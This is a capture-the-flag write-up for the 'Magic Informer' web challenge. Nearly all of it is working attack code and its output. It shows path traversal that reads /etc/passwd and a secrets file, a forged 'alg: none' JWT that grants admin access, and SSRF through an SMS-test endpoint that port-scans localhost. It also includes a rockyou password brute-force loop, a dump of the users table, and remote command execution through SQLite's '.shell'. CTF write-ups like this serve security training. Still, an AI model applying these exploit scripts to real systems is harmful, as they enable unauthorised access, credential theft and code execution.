# The Magic Informer

http://167.99.94.114:31956/dashboard#

1. Create an account: http://167.99.94.114:31956/register
2. Login: http://167.99.94.114:31956/login

## Files download

Upload a CV and download it with URL: `http://167.99.94.114:31956/download?resume=de2d958f90bb82cda89c8e7fd371f3c0.docx`, get passwd with: `http://167.99.94.114:31956/download?resume=....//....//....//....//....//etc/passwd`

```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000:Linux User,,,:/home/node:/bin/sh
```

And the source code: `http://167.99.94.114:31956/download?resume=....//....//....//....//....//app//index.js`

```js
import * as dotenv from 'dotenv';
import cookieParser from "cookie-parser";
import path from "path";
import express from "express";
import nunjucks from "nunjucks";
import fileUpload from "express-fileupload";
import * as router from "./routes/index.js";
import { Database } from "./database.js";

dotenv.config({path: '/app/debug.env'});

const app = express();
const db = new Database('admin.db');

app.use(express.json());
app.use(cookieParser());
app.use(
    fileUpload({
        limits: {
            fileSize: 2 * 1024 * 1024 // 2 MB
        },
        abortOnLimit: true
    })
);

nunjucks.configure('views', {
    autoescape: true,
    express: app
});

app.disable('etag');

app.set('views', './views');
app.use('/static', express.static(path.resolve('static')));

app.use(router.default(db));

app.all('*', (req, res) => {
    return res.status(404).send({
        message: '404 page not found'
    });
});

(async () => {
    await db.connect();
    await db.migrate();
    app.listen(1337, '0.0.0.0', () => console.log('Listening on port 1337'));
})();
```

And the .env: `http://167.99.94.114:31956/download?resume=....//....//....//....//....//app//debug.env`, `DEBUG_PASS=CzliwZJkV60hpPJ`.

## JWT

```
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjwvaDE-PC9wPjxzY3JpcHQ-YWxlcnQoJ1hTUycpOzwvc2NyaXB0PiIsImlhdCI6MTY2OTk4Njg0NH0.3k-DrKL7wY3T0QJ0N_6owMKRTevB1TLSXPeC5Rrit8k
```

```python
from base64 import urlsafe_b64decode, urlsafe_b64encode
from json import dumps

urlsafe_b64decode(b'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9') # b'{"alg":"HS256","typ":"JWT"}'
urlsafe_b64decode(b'eyJ1c2VybmFtZSI6IjwvaDE-PC9wPjxzY3JpcHQ-YWxlcnQoJ1hTUycpOzwvc2NyaXB0PiIsImlhdCI6MTY2OTk4Njg0NH0=') # b'{"username":"</h1></p><script>alert(\'XSS\');</script>","iat":1669986844}'
urlsafe_b64decode(b'3k-DrKL7wY3T0QJ0N_6owMKRTevB1TLSXPeC5Rrit8k=') # signature b'\xdeO\x83\xac\xa2\xfb\xc1\x8d\xd3\xd1\x02t7\xfe\xa8\xc0\xc2\x91M\xeb\xc1\xd52\xd2\\\xf7\x82\xe5\x1a\xe2\xb7\xc9'

jwt = (urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode() + '.' + urlsafe_b64encode(b'{"username":"admin","iat":1669986844}').decode() + ".3k-DrKL7wY3T0QJ0N_6owMKRTevB1TLSXPeC5Rrit8k").replace("=", "")

from urllib.request import urlopen, Request
response = urlopen(Request("http://167.99.94.114:31956/admin", headers={'Cookie': 'session=' + jwt})) # Access to admin page !

print(jwt) # In your browser: document.cookie="session={jwt}"

for x in range(1335, 65535):
    response = urlopen(
        Request(
            "http://167.99.94.114:31956/api/sms/test",
            data=dumps(
                {
                    "verb": "POST",
                    "url": f"http://\u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031:{x}/debug/sql/exec", # "http://167.99.94.114:31956/debug/sql/exec",
                    "params": dumps({"sql": "select * from enrollments;","password": "DEBUG_PASS"}),
                    "headers": "Content-Type: application/json\r\nCookie: session=" + jwt,
                    "resp_ok": "<status>ok</status>",
                    "resp_bad": "<status>error</status>"
                }
            ).encode(), # .replace(b'127.0.0.1', b'\\u0031\\u0032\\u0037\\u002e\\u0030\\u002e\\u0030\\u002e\\u0031')
            headers={'Content-Type': 'application/json', 'Cookie': 'session=' + jwt},
            method='POST',
        )
    )
    print(x)
    data = response.read()
    if data != b'{"status":"fail","result":"Address is unreachable"}':
        print(data)
        break

# port 1337 b'{"status":"fail","result":"{\\"message\\":\\"Invalid debug password supplied!\\"}"}'

passwords = open('rockyou.txt', 'r')
c = 0
# for password in passwords:
#     c += 1
#     if password == "babygirl143\n":
#         break

for password in passwords:
    c += 1
    response = urlopen(
        Request(
            "http://167.99.94.114:31956/api/sms/test",
            data=dumps(
                {
                    "verb": "POST",
                    "url": f"http://\u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031:1337/debug/sql/exec", # "http://167.99.94.114:31956/debug/sql/exec",
                    "params": dumps({"sql": "select * from enrollments;","password": password[:-1]}),
                    "headers": "Content-Type: application/json\r\nCookie: session=" + jwt,
                    "resp_ok": "<status>ok</status>",
                    "resp_bad": "<status>error</status>"
                }
            ).encode(), # .replace(b'127.0.0.1', b'\\u0031\\u0032\\u0037\\u002e\\u0030\\u002e\\u0030\\u002e\\u0031')
            headers={'Content-Type': 'application/json', 'Cookie': 'session=' + jwt},
            method='POST',
        )
    )
    print(c, password[:-1])
    data = response.read()
    if data != b'{"status":"fail","result":"{\\"message\\":\\"Invalid debug password supplied!\\"}"}':
        print(data)
        break

passwords.close()
```

## SQL

POST http://167.99.94.114:31956/debug/sql/exec {"sql":"select * from enrollments;","password":"DEBUG_PASS"}

`Blocked: This endpoint is whitelisted to localhost only.`

POST http://167.99.94.114:31956/sms-settings {"verb":"POST","url":"http://127.0.0.1:30319/debug/sql/exec","params":"{\"sql\":\"select * from enrollments;\",\"password\":\"DEBUG_PASS\"}","headers":"Content-Type: application/json\nCookie: session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjY5OTg2ODQ0fQ.3k-DrKL7wY3T0QJ0N_6owMKRTevB1TLSXPeC5Rrit8k","resp_ok":"<status>ok</status>","resp_bad":"<status>error</status>"}

```python
from base64 import urlsafe_b64decode, urlsafe_b64encode
from urllib.request import urlopen, Request
from json import dumps

jwt = (urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode() + '.' + urlsafe_b64encode(b'{"username":"admin","iat":1669986844}').decode() + ".3k-DrKL7wY3T0QJ0N_6owMKRTevB1TLSXPeC5Rrit8k").replace("=", "")

response = urlopen(
    Request(
        "http://161.35.173.232:30925/api/sms/test",
        data=dumps(
            {
                "verb": "POST",
                "url": f"http://\u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031:1337/debug/sql/exec", # "http://167.99.94.114:31956/debug/sql/exec",
                "params": dumps({"sql": ".schema users","password": "CzliwZJkV60hpPJ"}),
                "headers": "Content-Type: application/json\r\nCookie: session=" + jwt,
                "resp_ok": "<status>ok</status>",
                "resp_bad": "<status>error</status>"
            }
        ).encode(), # .replace(b'127.0.0.1', b'\\u0031\\u0032\\u0037\\u002e\\u0030\\u002e\\u0030\\u002e\\u0031')
        headers={'Content-Type': 'application/json', 'Cookie': 'session=' + jwt},
        method='POST',
    )
)

print(response.read().decode())
```

`select * from enrollments;`

```
{"status":"success","result":"{\"sql\":\"select * from enrollments;\",\"output\":\"1,test,,,,,,de2d958f90bb82cda89c8e7fd371f3c0.docx\\n2,TheHedgehog,Sonic,\\\"06 06 06 06 06\\\",2022-12-01,male,\\\"I'm famous!\\\",\\n3,pipi,,,,,,\\n4,cat,,,,,,e3599c6cfd9f15e2df189cb33e9823bb.docx\\n\"}"}
```

`select * from users;`

```
{"status":"success","result":"{\"sql\":\"select * from users;\",\"output\":\"1,admin,3e6add0619f2e08315ba0e0523809fcc,1\\n\"}"}
```

`WITH Test(x, y) AS (SELECT UNIXEPOCH(), 1 UNION ALL SELECT x - (24 * 60 * 60), y + 1 FROM Test WHERE y < 20) SELECT x FROM Test;`

```
{"status":"success","result":"{\"sql\":\"WITH Test(x, y) AS (SELECT UNIXEPOCH(), 1 UNION ALL SELECT x - (24 * 60 * 60), y + 1 FROM Test WHERE y < 20) SELECT x FROM Test;\",\"output\":\"Error: no such function: UNIXEPOCH\\n\"}"}
```

So it's a SQlite3 database without `UNIXEPOCH` (< version 3.38).

`.tables`

```
{"status":"success","result":"{\"sql\":\".tables\",\"output\":\"enrollments  settings     users      \\n\"}"}
```

`.schema users`

```
{"status":"success","result":"{\"sql\":\".schema users\",\"output\":\"CREATE TABLE users (\\n                id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,\\n                username   VARCHAR(255) NOT NULL UNIQUE,\\n                password   VARCHAR(255) NOT NULL,\\n                verified   BOOLEAN      NOT NULL DEFAULT false\\n            );\\n\"}"}
```

## RCE from SQLite query

```python
from base64 import urlsafe_b64decode, urlsafe_b64encode
from urllib.request import urlopen, Request
from json import dumps, loads

jwt = (urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode() + '.' + urlsafe_b64encode(b'{"username":"admin","iat":1669986844}').decode() + ".3k-DrKL7wY3T0QJ0N_6owMKRTevB1TLSXPeC5Rrit8k").replace("=", "")

response = urlopen(
    Request(
        "http://161.35.173.232:30925/api/sms/test",
        data=dumps(
            {
                "verb": "POST",
                "url": f"http://\u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031:1337/debug/sql/exec", # "http://167.99.94.114:31956/debug/sql/exec",
                "params": dumps({"sql": ".shell /readflag","password": "CzliwZJkV60hpPJ"}),
                "headers": "Content-Type: application/json\r\nCookie: session=" + jwt,
                "resp_ok": "<status>ok</status>",
                "resp_bad": "<status>error</status>"
            }
        ).encode(), # .replace(b'127.0.0.1', b'\\u0031\\u0032\\u0037\\u002e\\u0030\\u002e\\u0030\\u002e\\u0031')
        headers={'Content-Type': 'application/json', 'Cookie': 'session=' + jwt},
        method='POST',
    )
)

print(loads(loads(response.read())["result"])['output'])
```

`.shell ls /`

```
app
bin
dev
etc
home
lib
media
mnt
opt
proc
readflag
root
run
sbin
srv
sys
tmp
usr
var
```

`.shell /readflag`

```
HTB{br0k3n_4u7h_55RF_4s_4_s3rv1c3_d3bug_ftw}
```

## Other soluce

Download executable from upload/download function (guessing on the filename and path), and launch it in debian:
http://161.35.173.232:30925/download?resume=....//....//....//....//....//readflag

```bash
chmod +x /home/user/Downloads/readflag
/home/user/Downloads/readflag
```